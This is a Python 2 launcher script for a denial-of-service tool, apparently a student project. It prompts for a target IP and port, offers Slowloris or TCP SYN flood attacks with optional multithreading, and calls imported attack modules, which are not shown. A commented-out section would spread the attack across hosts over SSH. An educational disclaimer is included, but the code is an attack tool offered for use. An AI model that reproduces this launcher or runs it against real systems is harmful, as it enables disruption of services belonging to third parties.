from __future__ import print_function
import sys
import slowloris as sls
import TCP_SYN_direct as tsd
import m_threading as mt
import ssh_pexpect as ssh
### Only use python 2 for this project...
def main():
	print("\n\nWelcome to DDoS Attack. This tool is developed by Stanley Yang from the University of Illinois at Urbana-Champaign."
	 "This tool is for educational purposes, abusively DDoSing publicly is a federal crime.")
	ip = input("\n Please enter the IP you want to attack:\n")
	port = int(input("\n Please enter the port you want to attack:\n"))
	method = int(input("\nYou are taking down {}, please select the attack method:"
		"\n 1.Slowloris"
		"\n 2.TCP SYN Flood\n".format(ip)))
	# ssh_option = int(input("\n DDoS or DoS?"
	# 	"\n 1.DoS"
	# 	"\n 2.DDoS\n"))
	multi_threading = int(input("\n multi_threading?:"
		"\n 1.Hell Yesssssssss!"
		"\n 2.Hell Nawwwwwwwww!"))

	#connect to hosts
	# if ssh_option == 2:
	# 	#default slowloris
	# 	#default enable multithreading
	# 	mode = 'slowloris'
	# 	enable_multithreading = 1
	# 	if method == 2:
	# 		mode = 'tcp'
	# 	if multi_threading != 1:
	# 		enable_multithreading = 0
	# 	ssh.process_ssh_and_start(ip,port,mode,enable_multithreading)

	### start local machine task
	#slowloris
	if method == 1:
		if multi_threading == 1:
			mt.start_attack_in_multithreading('slowloris',ip,port)
		else:
			sls.start_slowloris(ip,port,1000)
	elif method == 2:
		if multi_threading == 1:
			mt.start_attack_in_multithreading('tcp',ip,port)
		else:
			tsd.TCP_SYN(ip,port)

	return 0








if __name__ == "__main__":
	main()